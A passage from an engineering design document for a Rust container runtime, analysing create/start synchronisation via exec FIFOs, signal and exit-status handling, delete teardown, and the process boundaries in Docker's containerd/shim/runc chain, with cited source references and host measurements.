a sound basis — that host's own bundles disagree with its own runtime. Rejecting is a
compatibility liability with zero safety benefit, because the field is not load-bearing for
any producer. The decision that actually matters is **which fields we honour, refuse, or warn
on**, which is 5.2's five hard errors plus a refusal (never a silent ignore) for anything in
the security dimension — seccomp, capabilities, `readonlyPaths`, `maskedPaths`.

### 5.5 The `create`/`start` rendezvous: `exec.fifo`

The container's init process must be fully constructed, then **park** until `start` arrives,
then `execve` the user program. The parking primitive is a FIFO.

**Fact.** `fifo(7)`: *"The FIFO must be opened on both ends (reading and writing) before data
can be passed. Normally, opening the FIFO blocks until the other end is opened also."* A
process that calls `open(path, O_WRONLY)` on a FIFO blocks inside `open()` until some other
process opens the same path for reading. **That blocking open is the entire synchronisation
primitive** — no message protocol, no polling, no CPU, no lock held.

**Observation.** Measured on `host-a`, kernel 6.11.0-29-generic, with `mkfifo -m 0622
/tmp/f2` and a two-thread Python script: a thread blocked in `os.open("/tmp/f2", O_WRONLY)`
was still blocked at t = 1.000 s; a blocking `os.open(..., O_RDONLY)` issued at t = 1.000 s
returned immediately; both the writer's `open()` and the reader's `read()` completed at
t = 1.001 s, with the reader receiving one byte.

**Fact — the property that decides the choice.** A FIFO is a rendezvous between two processes
that are **not related and share no file descriptor**. A pipe, an `eventfd` and a
`socketpair` all require either inheritance across `fork` or an `SCM_RIGHTS` hand-off, so
they can only connect processes that already have a relationship. `mydocker start <id>` is a
fresh process invocation that is not a descendant of the supervisor and cannot be handed an
inherited fd. Choosing any of the three alternatives forces `start` to become an IPC client
of the supervisor. The FIFO is openable **by name**, by anyone with path access, at any time.

**Convention.** runc's direction: the container init blocks in `open(O_WRONLY)` and writes one
byte immediately before `execve`; `start` opens the read side and reads it. The fd is handed
to the init side as an **`O_PATH`** descriptor (`O_PATH|O_CLOEXEC`), because a real `O_WRONLY`
open would itself block in the parent; the child re-opens it for writing through
`/proc/self/fd/N`. The FIFO's mode is `0622` (`rw--w--w-`) so that a container init running
as an unprivileged uid can open it for writing.

**Convention.** crun inverts the direction: the child holds the FIFO's **read** end and blocks
in `select()`/`read()`, and the parent writes on `start`
(`crun@1.30.1/src/libcrun/container.c`, `libcrun_status_write_exec_fifo()`). youki uses a
different primitive entirely — a unix `SOCK_STREAM` socket, `notify.sock`, with init blocking
in `accept()` immediately before `execve`
(`youki@v0.7.0/crates/libcontainer/src/notify_socket.rs`).

**Recommendation.** Use a FIFO, in runc's direction (init blocks in `open(O_WRONLY)`; `start`
opens `O_RDONLY` and reads). The reason to prefer the FIFO over youki's socket is concrete
rather than aesthetic: `sockaddr_un.sun_path` is 108 bytes including the NUL, and a
per-container socket under a path containing a 64-hex id is within two bytes of that limit
before any prefix or non-default root. A FIFO has no such limit. The reason to prefer runc's
direction is that no file descriptor has to survive the create/start gap, which matters
precisely because `start` is a separate process invocation.

**Correction — do not copy the naive start side.** The obvious implementation of `start` is
"open the FIFO `O_RDONLY`, read one byte, done". That deadlocks. If the container init died
between `create` and `start` — the user's binary does not exist, or the cgroup OOM-killed it
— no writer will ever open the FIFO, and `start` blocks inside `open()` **forever**. runc has
guarded this since 2019 (`opencontainers/runc@8541d9cf3d8b`, *"Fix race checking for process
exit and waiting for exec fifo"*); `runc@v1.5.2/libcontainer/container_linux.go#L233-301`
performs the blocking open on a goroutine while the main loop wakes every 100 ms and `stat`s
the init pid, bailing out if it is dead or a zombie.

**Recommendation.** Do better than runc with less code: open the read side
`O_RDONLY|O_NONBLOCK` — `fifo(7)` guarantees this *"succeeds even if no one has opened on the
write side yet"* — and then `poll()` that fd **together with a `pidfd_open(init_pid)`**.
`POLLIN` on the FIFO means the container signalled execve-readiness; `POLLIN` on the pidfd
means init died first. No background thread, no 100 ms wakeups, no PID-reuse window.
`conmon@v2.2.1/src/ctrl.c#L289-293` uses the same `O_RDONLY|O_NONBLOCK`-first ordering for its
control FIFO, for the same reason.

**Fact — permissions.** A `0622` FIFO is world-writable. What contains it is the **mode of the
state root**, not the per-container directory. `runc@v1.5.2/libcontainer/factory_linux.go#L45`
creates the root `0o700`; line 91 creates each per-container directory `0o711`
(traversable, not listable); `state.json` is `0600`.

**Observation.** Verified live on `host-a` with `sudo stat -c '%a %n'`: `700` on
`/run/docker/runtime-runc/moby`, `711` on every per-container directory, `600` on every
`state.json`.

**Recommendation.** Create the state root `0700` explicitly and assert it on every startup.
Without it, any local user who learns a container id can `open(exec.fifo, O_RDONLY)` and start
a container that was created but deliberately not started.

### 5.6 Signal forwarding, and why `stop` takes the full grace period

**Fact.** `pid_namespaces(7)`: a signal sent from **outside** a PID namespace to that
namespace's PID 1 is delivered only if PID 1 has **installed a handler** for that signal.
Default dispositions do not apply to a namespace's init for signals originating outside the
namespace. `SIGKILL` and `SIGSTOP` are the two exceptions, enforced by the kernel.

**Fact.** Therefore a container whose PID 1 is a shell, or an application that never called
`signal()`/`sigaction()` for `SIGTERM`, **cannot be terminated by `SIGTERM` from the host at
all.** The signal is not ignored by the application; it is never delivered.

**Convention.** `docker stop` sends `SIGTERM`, waits 10 seconds, then sends `SIGKILL`. The
10-second wait is almost always consumed in full for exactly the reason above, and the
behaviour is routinely misdiagnosed as a slow shutdown handler.

**Recommendation.** Implement `stop` as `SIGTERM → timeout → SIGKILL`, make the timeout a
flag, and **document the kernel reason in the user-facing help text**. The alternative
designs people reach for — sending `SIGKILL` immediately, or sending to the whole cgroup on
the first attempt — break the containers that *do* implement graceful shutdown, which are the
only ones for which `stop` means anything.

**Convention.** runc forwards signals **by pid, to init only**, not cgroup-wide
(`runc@v1.5.2/signals.go`). It consumes `SIGCHLD` (which triggers its reap loop), ignores
`SIGURG` (the Go runtime uses it for preemption — a Go-specific exclusion with no analogue for
us), and converts `SIGWINCH` into a terminal resize.

**Convention.** runc special-cases killing *everything*: when the container's PID namespace is
**shared** with the host, killing init does not kill the rest, so runc enumerates and kills
the cgroup's pids. On cgroup v1 it must thaw a frozen cgroup first, because a signal to a
process in a frozen v1 cgroup does nothing until it is thawed.

**Fact.** cgroup v2 removes that entire dance: writing `1` to a cgroup's `cgroup.kill` sends
`SIGKILL` to every process in the cgroup and all its descendant cgroups, atomically, with no
freeze/thaw and no enumeration race. Requires kernel ≥ 5.14. The file does not exist in the
root cgroup.

**Observation.** On `host-a` (kernel 6.11.0-29), `sudo ls
/sys/fs/cgroup/system.slice/docker-<id>.scope/` lists `cgroup.kill`, `cgroup.freeze`,
`cgroup.events` and `cgroup.procs`; `ls /sys/fs/cgroup/cgroup.kill` is not found.

**Recommendation.** `kill <id> <sig>` targets init by pid. `kill --all` and the final
`SIGKILL` of `stop` write `cgroup.kill`. Verify the pid before signalling it (5.7).

### 5.7 Exit-status collection, and who can observe it

**Lead with the conclusion: the exit status of a process is visible to exactly one party — the
process that `wait()`s for it — and it is destroyed if that party dies first. Therefore the
exit status must be written to disk before it is announced anywhere, and the on-disk record,
not any live process, must be the source of truth.**

**Fact.** `wait(2)`/`waitid(2)` return a status only to the parent. `waitid(P_PIDFD, fd, …)`
does not change this: `wait(2)` says *"Wait for **the child** referred to by the PID file
descriptor"*, and a pidfd for a non-child yields `ECHILD`.

**Fact.** `pidfd_open(2)` gives an fd that becomes `EPOLLIN`-readable when the target task
terminates and `EPOLLHUP` when it is reaped — and this notification works for **any** process,
not just a child. It is immune to PID reuse.

**Fact.** Since **Linux 6.15**, the exit code itself is retrievable from a pidfd:
`ioctl(pidfd, PIDFD_GET_INFO, &info)` with `mask |= PIDFD_INFO_EXIT` fills `__s32 exit_code`.
Pinned: `PIDFD_GET_INFO` is absent in `torvalds/linux@v6.12/include/uapi/linux/pidfd.h` and
present at `@v6.13`; `PIDFD_INFO_EXIT` is absent at `@v6.14` and present at `@v6.15`. The
pidfd must be held from **before** the exit. It still dies with its holder, so this relaxes
nothing about the disk write.

**Unverified, with the exact test.** The *existence* of that interface at those kernel
versions is established from the pinned headers. What is **not** measured is the behaviour
that would matter to us — whether a holder that is **not** the target's parent gets a
truthful `exit_code` back. That is an inference from the API's shape, not an observation; no
host available to this research runs a kernel ≥ 6.15 (`host-a` is 6.11.0-29). The test:
on a kernel ≥ 6.15, `pidfd_open(pid)` against an **unrelated** process, wait for it to die,
then `ioctl(fd, PIDFD_GET_INFO, &info)` with `mask = PIDFD_INFO_EXIT`; assert
`info.mask & PIDFD_INFO_EXIT` is set and `info.exit_code` matches what the process actually
returned. It decides whether `ps` can ever report a truthful exit code for a container whose
*reaping* parent was not us — so treat it as a possible future improvement, never as a
reason to weaken the on-disk write.

**Fact — the reparenting rule, which decides whether a subreaper helps.**
`prctl(PR_SET_CHILD_SUBREAPER, 1)` marks a process so that orphaned descendants reparent to it
rather than to PID 1. But `torvalds/linux@v6.11/kernel/exit.c#L625-658` (`find_new_reaper`)
walks ancestors only while `task_pid(reaper)->level == ns_level` — **the search never crosses
a PID namespace boundary**. `pid_namespaces(7)` states the consequence: an orphan is
reparented to the init process *"in the PID namespace of its parent"*, unless a nearer
ancestor **in that same namespace** is a subreaper.

Mapped onto a supervisor that is the container init's direct parent:

| Who dies | Who adopts the orphan | Does `PR_SET_CHILD_SUBREAPER` matter? |
|---|---|---|
| nothing — init is a direct child of the supervisor | n/a, the supervisor `wait()`s normally | **no** |
| an `exec` helper in the **host** pidns whose child was `setns`'d into the container's pidns | the supervisor (same `ns_level`) | **yes — this is the only case** |
| a process **inside** the container's pidns | the container's own PID 1 | **no, never** |
| the supervisor itself | host PID 1 (systemd), which `wait()`s and discards | exit status **lost** |

**Trap.** "Set `PR_SET_CHILD_SUBREAPER` so the container's exit code is recoverable" is wrong
for a supervisor that clones init directly, and "set it so zombies inside the container get
reaped" is wrong unconditionally — zombies inside the container reparent to the container's
PID 1 and no host-side flag reaches them. The flag is load-bearing for `exec` descendants and
for `--pid=host` containers, and for nothing else.

**Convention.** conmon needs the flag because conmon does **not** create the container: it
forks a child that `execv`s `crun create`, and `crun create` forks again, detaches, clones
init and exits (`crun@1.30.1/src/libcrun/container.c#L3014-3065`). The container init is
orphaned *by construction*, and only a subreaper catches it
(`conmon@v2.2.1/src/conmon.c#L131-140`). containerd's shim documents the same role.

**Convention.** A subreaper is a mode you enter and leave, not a flag you set once.
`conmon@v2.2.1/src/ctr_exit.c#L166-174` turns its own subreaper flag **off** before
double-forking the exit command — *"We don't want the exit command to be reaped by the parent
conmon as that would prevent double-fork from doing its job."*

**Convention.** `runc@v1.5.2` keeps **no exit code on disk**. Once init is gone, `runc state`
reports `stopped` and that is all it knows. This is the single gap that forces a supervisor
process to exist above runc at all.

**Convention.** conmon's teardown order, `conmon@v2.2.1/src/conmon.c#L470-529`, in exactly
this sequence: (1) `check_cgroup2_oom()` — read the OOM counter; (2) `drain_stdio()`;
(3) `sync_logs()`; (4) compute the status (`ctr_exit.c#L119-126`: `WIFEXITED → WEXITSTATUS`,
`WIFSIGNALED → 128 + WTERMSIG`, otherwise `-1`); (5) `close_other_fds()` — *"Podman injects
some fd's into the conmon process so that exposed ports are kept busy while the container
runs. Close them before we notify the container exited, so that they can be reused
immediately"*; (6) write the exit status to a per-container file **and** to an entry in a
shared flat directory — *"Writing to this directory helps if a daemon process wants to monitor
all container exits using inotify."*

**Recommendation.** Adopt that order, with three refinements.
- **Drain and flush the log before writing `exited`.** Writing the terminal status first and
  then failing to flush produces a container reported as cleanly exited whose last few KiB of
  output — the panic message — is gone.
- **Release host resources before announcing the exit, not after.** The moment we publish
  ports, holding a listening socket to reserve the host port and releasing it after writing
  `exited` opens a window in which a racing `run -p` on the same port fails.
- **Do not flatten "killed by signal N" into `128+N`.** Keep `exit_code: Option<i32>` where
  `None` means genuinely unknown, plus separate `signal: Option<i32>` and `oom_killed: bool`.
  A default of `Some(0)` for a running container is a lie that only works because another
  field overrides it.

**Recommendation.** Take a pidfd for the container init at clone time — `clone3` can return it
via `CLONE_PIDFD` with no race at all — and keep it for the container's life. It gives a
PID-reuse-proof liveness test, a `poll`-able death notification that composes with the exec
FIFO wait of 5.5, and on kernel ≥ 6.15 a second independent source for the exit code.
crun already uses `pidfd_open` for `kill` with a `kill(2)` fallback on `ENOSYS`
(`crun@1.30.1/src/libcrun/linux.c#L7388-7399`).

**Recommendation.** Keep a `/proc/<pid>/stat` field-22 start-time check as the PID-reuse
defence **only for the case where the supervisor is already dead** and no pidfd exists. runc
uses it unconditionally (`container_linux.go`: reject if `stat.StartTime !=
initProcessStartTime || state == Zombie || state == Dead`); with a live pidfd it is redundant.

### 5.8 What `delete` must undo

**Fact.** *"Deleting a container MUST delete the resources that were created during the
`create` step"*, and resources not created by the container MUST NOT be deleted (5.2).

**Fact — the atomicity property that does most of the work for free.**
`mount_namespaces(7)`: when the last process in a mount namespace exits and nothing holds a
reference to the namespace, the namespace and every mount inside it are torn down by the
kernel. Everything the container init mounts **after** it is in its own mount namespace
therefore needs no rollback at all — letting the child die *is* the rollback. The mounts that
need explicit teardown are exactly the ones made **before** the clone, in the host's mount
namespace.

**Recommendation.** Do as little as possible in the host mount namespace. A leaked overlay
mount in the host namespace pins its lower and upper directories: `rm` deletes the
directories, the mount survives, the disk is never reclaimed, and `df` disagrees with `du`
until reboot. That is the worst and most common real-world container-runtime disk bug, and it
disappears entirely if the rootfs mount can be made inside the container's mount namespace.

**Fact.** A namespace persists as long as *anything* holds a reference — a process, an open
fd, or a bind-mount of `/proc/<pid>/ns/X` (`namespaces(7)`). Any netns we bind-mount to make
persistent is therefore a teardown item in its own right, independent of process lifetime.

The explicit teardown list, in reverse acquisition order: kill and reap init (if alive) →
remove the cgroup directory → unmount anything mounted in the host mount namespace → release
network resources (IP from the pool, host-side veth, any netns bind-mount) → remove runtime
artifacts (FIFO, sockets) → remove the state directory **last**, so a partial failure leaves
something retryable and a success leaves nothing.

**Convention.** Both reference implementations roll back a failed `create` by invoking their
own forced `delete`, rather than by replaying a recorded list of acquisitions.
`runc@v1.5.2/utils_linux.go#L222-228` defers `r.destroy()` on error, gated by a `--keep`
escape hatch so an operator can inspect the corpse.
`crun@1.30.1/src/libcrun/container.c` calls `force_delete_container_status()` on every failure
path of `libcrun_container_create()` (`#L3004`, `#L3057`), and when the detached child reports
a non-zero code the parent runs `libcrun_container_delete(..., force=true, ...)` with the log
line *"Exit code is `%d`, deleting container"* (`#L3034-3037`).

**Recommendation.** `create`'s rollback and `delete` must be the **same code path**, differing
only in where they start. If they are separate implementations they will diverge, and the
divergence will be a leak. `delete --force` must succeed against arbitrary corruption —
unparseable state file, dead pid, reused pid, cgroup already gone, mount already gone,
supervisor gone — doing every step best-effort, collecting all errors, and reporting them all.
The failure mode to avoid is `delete` bailing on the first `ENOENT`, leaving a container that
can never be removed, which forces users to `rm -rf` the state directory by hand — at which
point they leak the mount.

**Fact — a pending spec change.** Every released revision says `delete` on a non-`stopped`
container MUST error. `runtime-spec@main` (as of 2026-10-16) has changed this:

```
- Attempting to delete a container that is not stopped MUST ... generate an error.
+ Attempting to delete a container that is neither created nor stopped MUST ...
+   generate an error.
+ Attempting to delete a container that is created MAY either have no effect ...
+   or terminate the container process and then delete the container.
```

**Recommendation.** Implement `delete` on a `created` container as **kill init, reap, then
delete**. That is the behaviour the next spec revision blesses, it is what users expect, and
`created`-and-never-started is the exact state a failed `run` leaves behind. Do not hard-error
on it.

**Recommendation.** Do **not** persist an acquisition journal (`rollback.json` or equivalent)
to make rollback-after-supervisor-death possible. Neither runc nor crun persists one; both
re-derive what to undo from the state file plus a **verbatim copy of `config.json`** kept
alongside it, which is also what CRI-O does when it restores volumes and ID mappings from the
spec on restart. Keeping that copy is load-bearing — the bundle may be gone by the time
`delete` runs. If a leak class later proves undiagnosable, the journal is additive and can be
added then.

---

## 6. Runtime architecture comparison

Docker's chain is five processes deep: `docker` CLI → `dockerd` → `containerd` →
`containerd-shim-runc-v2` → `runc` → kernel. Each boundary was added to solve a specific
problem. **The question that matters is not what each boundary does, but whether the problem
it solves is a problem we have** — and for a single-machine, single-user, non-Kubernetes
engine, most of them are not.

### 6.1 Ground truth: what the chain actually looks like running

**Observation.** `ps -eo pid,ppid,pgid,sid,comm,args` on `host-a` (Ubuntu 24.10, kernel
6.11.0-29-generic, Docker 28.3.1 / containerd 1.7.27 / runc 1.2.5):

```
    912       1     912     912 containerd       /usr/bin/containerd
  70234       1   70234   70234 dockerd          /usr/bin/dockerd -H unix:///var/run/docker.sock --containerd=...
2585480       1 2585480     912 containerd-shim  /usr/bin/containerd-shim-runc-v2 -namespace moby -id 88ecb99... 
2588176   70234   70234   70234 docker-proxy     /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 80 ...
```

Four facts fall out of that table directly, each verified:

- **The shim's PPID is 1, not containerd's 912** (`grep PPid /proc/2585480/status` → `PPid:
  1`), for all five live shims. **But its SID is 912 — containerd's session**, and its PGID is
  its own pid. So containerd's spawn does `setpgid(0,0)` and a fork-and-exit, but **not**
  `setsid()`: the shim is orphaned into PID 1, not detached by session.
- **The container init is a child of the shim, and is PID 1 inside its own namespace.**
  `/proc/2585529/status` → `PPid: 2585480`, `NStgid: 2585529 1`, `NSpid: 2585529 1`,
  `NSpgid: 2585529 1`, `NSsid: 2585529 1`.
- **The shim is not in the container.** `readlink /proc/2585480/ns/*` returns the same inodes
  as `/proc/1/ns/*` for every namespace type. The container init differs in
  mnt/uts/ipc/pid/cgroup/net but **shares** `user` and `time` with the host.
- **The shim is deliberately not in the container's cgroup.** `/proc/2585480/cgroup` →
  `/system.slice/containerd.service`; the container init's →
  `/system.slice/docker-<id>.scope`. `cgroup.procs` of that scope lists the nginx master and
  its four workers and nothing else.

**Observation.** `docker-proxy` is a direct child of `dockerd`, same PGID and SID — dockerd
keeps its userspace port-forwarders inside its own process group, so they die with it, unlike
shims.

**Observation.** Start times (`ps -o lstart=`): containerd started 2026-02-28, dockerd started
2026-03-02, the oldest shim 2026-03-02 later the same day. **dockerd is younger than
containerd and younger than nothing else** — i.e. dockerd was restarted while containerd and
its shims kept running. The dockerd↔containerd decoupling, observed rather than asserted.
(`docker info` reports `Live Restore Enabled: false` with no `/etc/docker/daemon.json`, so
this is dockerd's process being replaced, not live-restore.)

**Observation — what the shim holds.** `sudo ls -l /proc/2585480/fd`, meaningful entries only:

| fd | Target | What it is |
|---|---|---|
| 0, 1 | `/dev/null` | the shim's own stdio |
| 2, 4, 7 | `.../moby/<id>/log` (a FIFO, `prwx------`) | the shim's own log, drained by containerd |
| **9** | `socket:[…]` | the ttrpc **listening** socket, confirmed by `ss -xlp` |
| 10, 22 | sockets | accepted ttrpc connections from containerd |
| **11, 13** | `pipe:[22485389]`, `pipe:[22485390]` | **the container's stdout/stderr pipes** |
| 12, 14, 15, 16 | `/run/docker/containerd/<id>/<id>-stdout` (FIFO) | **both** write and read ends |
| 17, 19, 20, 21 | `…-stderr` (FIFO) | **both** ends again |

`readlink /proc/2585480/cwd` → the bundle directory. The shim `chdir`s into the bundle, which
is why the bundle cannot be removed while the shim lives.

**Observation — the whole `docker logs` pipeline, in three of dockerd's fds.** On the same
host, `/proc/70234/fd` for the same container id: fd 43 = `…-stdout` opened read-only, fd 45 =
`…-stderr` read-only, fd 42 = `/var/lib/docker/containers/<id>/<id>-json.log` write-only.
Shim writes the FIFO → dockerd reads the FIFO → dockerd appends framed JSON to disk.

### 6.2 Boundary by boundary

#### Boundary 1 — `docker` CLI → `dockerd`, HTTP/REST over `/var/run/docker.sock`

**Buys:** a remote-capable API (the same protocol over TCP/TLS and over SSH); a CLI that needs
no privilege, with socket group membership as the entire authorization model; version skew
tolerance, since the CLI is a client and may be older, newer, in another language, or absent
(compose, CI, Portainer); and **the CLI is not in the container's process ancestry**, so
`Ctrl-C` on `docker run` does not kill the container unless the CLI chooses to forward the
signal.

**Convention.** `attach` and `exec start` use HTTP hijacking — the connection is upgraded off
HTTP into a raw bidirectional byte stream. Without a TTY the stream is multiplexed with an
**8-byte frame header**: `moby/moby@v28.3.1/pkg/stdcopy/stdcopy.go#L16-31` defines
`stdWriterPrefixLen = 8`, `stdWriterFdIndex = 0`, `stdWriterSizeIndex = 4`, and
`Stdin=0, Stdout=1, Stderr=2, Systemerr=3`. With a TTY there is a single unframed stream,
because a pty has only one output side.

**Breaks without it:** remote control; multi-client attach; version skew tolerance; `docker
logs` on a container whose creating CLI is long gone.

**Does the reason apply to us?** **No, and the reason is clean: every benefit above except one
is a remote or multi-client benefit**, and we are single-machine and single-user. The one
exception — the CLI not being in the container's ancestry — is obtainable for free with a
fork/exec supervisor and no API at all. Adding REST in phase 1 buys an HTTP server, a
versioned API surface, a socket permission model and a second serialization format in
exchange for nothing we need. **But one consequence survives the deletion:** the state model
must still assume concurrent clients, because two `mydocker` invocations at once is a real
scenario with no daemon in sight.

#### Boundary 2 — `dockerd` → `containerd`, gRPC over `/run/containerd/containerd.sock`

**Buys:** container lifecycle that survives dockerd restarts and crashes (the reason the split
was made in 2016–17); a reusable component with a CRI plugin, so Kubernetes can skip dockerd;
separation of the content-addressed image store and snapshotter from the Docker API surface;
and `namespaces` (`moby`, `k8s.io`, `default`) so independent consumers share one containerd
without seeing each other's containers.

**Convention.** What dockerd still owns after the split: the REST API; `docker-proxy`
userspace port forwarding; libnetwork, including the container network namespaces at
`/run/docker/netns/*` — **dockerd owns the netns, not containerd**; the json-file logger;
volumes; BuildKit; and the *container* concept as opposed to containerd's *task* concept.

**Does the reason apply to us?** **The rationale is real; the mechanism is heavier than we
need.** "Restart the management layer without killing containers" is genuinely valuable and we
should preserve the *property* — but the property does not require a second daemon, it
requires that **nothing in the container's supervision path is owned by the management
layer**. With no daemon at all, the property is free.

**Trap — the design smell this split introduced.** The log *reader* lives in a different
process from the *writer*. **Fact.** `pipe(7)`: a pipe or FIFO with no reader and a full
buffer blocks the writer. The default capacity is 16 pages; measured on `host-a`,
`getconf PAGESIZE` → 4096, `/proc/sys/fs/pipe-max-size` → 1048576 (so the default is not
clamped) and `pipe-user-pages-soft` → 16384, which `pipe(7)` says applies only to users
holding neither `CAP_SYS_RESOURCE` nor `CAP_SYS_ADMIN` — i.e. not to a root-first engine.
**So: 65,536 bytes.** If dockerd is down, a container stalls after 64 KiB of unread output,
roughly one second of a chatty process. **Recommendation.** Our supervisor writes the log file
itself and needs nobody.

#### Boundary 3 — `containerd` → `containerd-shim-runc-v2`, ttrpc over a per-container socket

This is the boundary people cargo-cult, so it is worth being exact about what it buys.

**Convention.** The shim protocol (`containerd/containerd@v2.4.2/docs/runtime-v2.md`): every
shim MUST implement a `start` subcommand, whose short-lived invocation writes the ttrpc
address to stdout and exits, leaving the real shim daemon it forked running. There is also a
mandatory `delete` subcommand — *"This command allows containerd to delete any container
resources created, mounted, and/or run by a shim when containerd can no longer communicate
over rpc"* — which *"MUST ensure that filesystem is also unmounted."*

**Observation.** The reconnect path is a file, not a process-tree walk. The bundle directory
holds `address` (`unix:///run/containerd/s/c362e1b7…`), and `ss -xlp` shows exactly that path
LISTENing on the shim's fd 9. After a containerd restart: read `address` from the bundle,
dial it. The bundle also holds `runtime`, `shim-binary-path`, `options.json`
(`{"binary_name":"runc","root":…,"systemd_cgroup":true}`), `init.pid`, `config.json`, and a
`work` symlink to the persistent side under `/var/lib/containerd`.

**The shim exists for five jobs**, each with a named failure mode if nothing does it:

1. **Hold the container's stdio open for the container's whole life.** Otherwise the read end
   belongs to whoever created it — and if that is `runc`, `runc` must live as long as the
   container. **Convention.** `runc@v1.5.2/docs/terminals.md` on why that is bad: *"any bug in
   the long-running foreground `runc` process (such as a memory leak) or a stray OOM-kill
   sweep could result in your container being killed through no fault of the user."*
2. **Own the pty master for a `terminal: true` container.** **Convention.** *"After `runc`
   exits, the only process with a copy of the pseudo-terminal master file descriptor is
   whoever read the file descriptor from the socket."* Without a holder, the master's last
   reference closes, the slave side gets `SIGHUP`/`EIO`, and the container's controlling
   terminal dies.
3. **Be the reaping parent**, so the exit status is not delivered to PID 1 and discarded.
4. **Be restartable and killable independently of containerd.**
5. **Publish the exit event**, with spec-mandated ordering: `TaskCreate` → `TaskStart` →
   `TaskExit` → `TaskDelete`.

**Convention — what breaks in practice.** containerd issue #13849: a shim parked in
`futex_wait_queue` with zero children after the container's PID 1 died; `TaskExit` never
emitted, so Docker reports the container as running and every API call against it hangs.
Issue #10727: killing the shim does not necessarily kill the container, and containerd may
then start a second shim and a second container process. Issue #3334: shims left behind after
their containers are removed. (All three are GitHub reports, not reproduced here.)

**The transferable lesson is not "shims are bad".** Every one of those bugs is the same bug:
**the single in-memory holder of the exit status became unreachable.** The exit status is
state that lives in exactly one place unless it is written down.

**Does the reason apply to us?** **The functions apply; the separate binary and the RPC
protocol do not.** We need something that holds stdio, holds the pty, reaps, and records the
exit status. We do not need it to be reachable by RPC from a daemon, because there is no
daemon. A `supervise` subcommand of the same binary, fork/exec'd and orphaned, with no
listening socket in phase 1, delivers all five functions.

#### Boundary 4 — shim → `runc`, fork/exec of a separate binary per operation

**Buys:** (a) the shim is Go and does not have to solve the Go-runtime-versus-`setns` problem,
because it delegates to a binary that solved it in C; (b) runtime pluggability — `options.json`
`binary_name` is literally a string, so swapping runc→crun→youki is a config change;
(c) the dangerous privileged code lives in a process that **exits**, so a bug in it cannot
corrupt long-lived state; (d) `runc` is a stateless CLI over a state directory, so any process
with the right `--root` can query or kill a container.

**Observation.** Property (d) is real and testable: `sudo runc --root
/run/docker/runtime-runc/moby list` run as a completely unrelated process returned correct
output for all five live containers created by containerd's shim.

**Does the reason apply to us?** **This is the boundary to collapse, and it is the single
biggest simplification available.** Reason (a) is a Go problem we do not have (6.3). Reason
(b) is pluggability we actively do not want — we own the runtime core by charter. Reason (d)
is a property of the **state model**, not of the process split, and we keep it by writing
state to disk. Only reason (c) is a genuine loss, and it is partially recovered by doing the
dangerous work in a child that **either `execve`s the user process or dies**, never in the
long-lived supervisor.

#### Boundary 5 — `runc init` → kernel

The syscall sequence is not this section's subject. The architectural question — *why this is
a separate process at all* — is 6.3.

### 6.3 The keystone: the `create`/`start` split is not a Go artefact

This is the single most consequential finding in the whole comparison, because the usual
telling of it leads a Rust implementation to the wrong conclusion.

**The usual telling.** runc re-execs itself as `runc init`, runs `nsexec.c` from a C
constructor before `main`, stages through `setjmp`/`longjmp`, and passes bootstrap data as a
netlink TLV — all because Go's runtime is multithreaded from the first instruction and
`setns(2)` is per-thread. Rust has no such runtime, therefore Rust can collapse the whole
thing, therefore Rust does not need the create/start split either.

**The last step is false.** The split is forced from two independent directions, neither of
which is about Go.

#### (a) The kernel constraint is `CLONE_FS`/`thread_group_empty()`, not "setns is per-thread"

**Fact.** `unshare(CLONE_NEWUSER)` from a multithreaded process is a hard `EINVAL`, not merely
unreliable. `torvalds/linux@v6.11/kernel/fork.c#L3272-3273` (`ksys_unshare`):
`if (unshare_flags & CLONE_NEWUSER) unshare_flags |= CLONE_THREAD | CLONE_FS;`, and
`#L3195-3198` (`check_unshare_flags`): with `CLONE_THREAD|CLONE_SIGHAND|CLONE_VM` set,
`if (!thread_group_empty(current)) return -EINVAL;`. `unshare(2)` states it in prose:
*"CLONE_NEWUSER requires that the calling process is not threaded."*

**Fact.** `setns(fd, CLONE_NEWUSER)` is a hard `EINVAL` for **two** independent reasons.
`torvalds/linux@v6.11/kernel/user_namespace.c#L1351-1355` (`userns_install`):
`if (!thread_group_empty(current)) return -EINVAL;` **and**
`if (current->fs->users != 1) return -EINVAL;`. `setns(2)` ERRORS lists both.

**Fact.** `setns(fd, CLONE_NEWNS)` — the mount namespace — fails `EINVAL` in **any**
multithreaded glibc or Go program. `torvalds/linux@v6.11/fs/namespace.c#L5698-5699`
(`mntns_install`): `if (fs->users != 1) return -EINVAL;`. Both glibc's NPTL and the Go runtime
create threads with `CLONE_FS`, so `fs->users` is effectively the thread count. Pinned for Go:
`golang/go@go1.24.4/src/runtime/os_linux.go#L158-163` sets
`cloneFlags = _CLONE_VM | _CLONE_FS | _CLONE_FILES | _CLONE_SIGHAND | _CLONE_SYSVSEM | _CLONE_THREAD`,
with the source comment on `_CLONE_FS` reading `/* share cwd, etc */`.

**Fact.** The genuinely "per-thread and therefore unreliable" case is
`unshare(CLONE_NEWNS)`, which **succeeds** in a multithreaded process but gives a private
mount namespace to the **calling thread only**. That is worse than an `EINVAL`: a goroutine
rescheduled onto another OS thread after the `unshare` finds itself back in the host's mounts
with no error anywhere.

**So the constraint is `CLONE_FS` and `CLONE_THREAD` sharing, not per-thread `setns`
semantics.** Both failure shapes are language-agnostic consequences of how threads are
created. **Go's only sin is making multithreading non-optional.**

#### (b) The spec mandates the split in four clauses, only one of which concerns hooks

**Fact**, all from `runtime-spec@v1.3.0/runtime.md`:

1. Lifecycle step 2: *"While the resources requested in the `config.json` MUST be created, the
   user-specified program (from `process`) MUST NOT be run at this time."*
2. Create: *"All of the properties configured in `config.json` except for `process` MUST be
   applied. `process.args` MUST NOT be applied until triggered by the `start` operation."*
3. State: `created` is one of four REQUIRED `status` values and must be reportable via
   `state` — so the state is externally observable, not an implementation detail.
4. Kill: *"Attempting to send a signal to a container that is neither `created` nor `running`
   MUST have no effect … and MUST generate an error."* — i.e. a container that has been
   created and not started **must still be killable**.

Only the hook window (lifecycle steps 3–5, between "namespaces exist" and "user program runs")
is about hooks. A runtime that never implements a single hook must still have an observable,
signallable `created` state. **Deferring hooks does not let us defer the split.**

#### (c) A single-threaded C program forks anyway, and says why

**Fact.** `crun@1.30.1/src/libcrun/linux.c#L6567-6568`, immediately before the first clone:

> *"Before attempting any `setns()` or `unshare()`, a `clone()` is required to not touch the
> caller context that can be used later on for running hooks."*

`unshare` is irreversible for the calling process. A supervisor that unshares in place loses
the host namespace context it needs afterwards — for `createRuntime` and `poststop` hooks, for
host-side teardown, and for opening host paths.

**Recommendation.** **Never `unshare()` in the supervisor; always `clone()` with the namespace
